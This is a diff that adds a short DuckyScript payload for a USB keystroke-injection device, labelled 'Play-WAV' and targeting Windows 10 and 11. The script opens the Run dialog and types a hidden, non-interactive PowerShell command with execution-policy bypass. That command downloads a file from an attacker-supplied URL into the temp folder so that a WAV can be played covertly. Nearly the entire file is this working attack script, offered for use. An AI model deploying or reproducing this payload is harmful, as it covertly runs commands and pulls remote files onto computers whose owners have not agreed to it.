@@ -1,0 +1,19 @@
+REM_BLOCK
+Title:       Play-WAV
+Author:      I am Jakoby
+Description: This payload is meant to play a WAV file hidden. See Play-WAV.ps1 for more 
+
+Target:      Windows 10, 11
+
+Remeber to replace the link with your link for the intended file to download
+Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+END_REM
+
+DEFINE #URL <Your Shared link for the intended file>
+
+DUCKY_LANG US
+DELAY 2000
+
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass iwr https://#URL?dl=1 -O $env:TMP\e.wav
